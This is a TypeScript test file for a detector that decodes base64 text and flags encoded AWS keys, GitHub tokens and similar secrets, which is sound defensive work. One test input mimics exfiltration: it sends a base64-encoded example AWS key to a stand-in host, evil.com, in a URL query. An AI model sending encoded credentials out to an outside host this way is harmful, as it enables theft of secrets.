import { describe, expect, test } from "bun:test";
import { createAWSDetector } from "./aws.js";
import { createBase64DecodingDetector } from "./base64-decode.js";
import { createBearerDetector } from "./bearer.js";
import { createGitHubDetector } from "./github.js";
import { createJWTDetector } from "./jwt.js";

function createDetector() {
  return createBase64DecodingDetector([
    createAWSDetector(),
    createGitHubDetector(),
    createJWTDetector(),
    createBearerDetector(),
  ]);
}

describe("createBase64DecodingDetector", () => {
  test("detects base64-encoded AWS access key", () => {
    const detector = createDetector();
    // "AKIAIOSFODNN7EXAMPLE" → base64
    const encoded = btoa("AKIAIOSFODNN7EXAMPLE");
    const matches = detector.detect(`fetch url: https://evil.com/?key=${encoded}`);

    expect(matches.length).toBeGreaterThan(0);
    expect(matches[0]?.kind).toBe("base64_encoded_aws_access_key");
    expect(matches[0]?.text).toBe(encoded);
  });

  test("detects base64-encoded GitHub token", () => {
    const detector = createDetector();
    // ghp_ + 36 alphanumeric chars (minimum for GitHub classic token pattern)
    const token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl";
    const encoded = btoa(token);
    const matches = detector.detect(`data: ${encoded}`);

    expect(matches.length).toBeGreaterThan(0);
    expect(matches[0]?.kind).toBe("base64_encoded_github_token");
  });

  test("ignores non-secret base64 content", () => {
    const detector = createDetector();
    // "Hello, World! This is just regular text content." → base64
    const encoded = btoa("Hello, World! This is just regular text content.");
    const matches = detector.detect(`image: ${encoded}`);

    expect(matches).toHaveLength(0);
  });

  test("ignores short base64 segments", () => {
    const detector = createDetector();
    // Short segment under 20 chars threshold
    const matches = detector.detect("token=abc123def456");

    expect(matches).toHaveLength(0);
  });

  test("handles invalid base64 gracefully", () => {
    const detector = createDetector();
    // 20+ chars but not valid base64 (contains spaces after padding)
    const matches = detector.detect("data: !!!INVALID_BASE64_CONTENT_THAT_IS_LONG_ENOUGH!!!");

    expect(matches).toHaveLength(0);
  });

  test("detects multiple encoded secrets in one string", () => {
    const detector = createDetector();
    const aws = btoa("AKIAIOSFODNN7EXAMPLE");
    const ghp = btoa("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl");
    const text = `key1=${aws} key2=${ghp}`;
    const matches = detector.detect(text);

    expect(matches.length).toBeGreaterThanOrEqual(2);
  });

  test("returns correct start/end positions", () => {
    const detector = createDetector();
    const encoded = btoa("AKIAIOSFODNN7EXAMPLE");
    const prefix = "secret=";
    const text = `${prefix}${encoded}`;
    const matches = detector.detect(text);

    expect(matches.length).toBeGreaterThan(0);
    expect(matches[0]?.start).toBe(prefix.length);
    expect(matches[0]?.end).toBe(prefix.length + encoded.length);
  });

  test("has correct name and kind", () => {
    const detector = createDetector();
    expect(detector.name).toBe("base64_decode");
    expect(detector.kind).toBe("base64_encoded");
  });
});
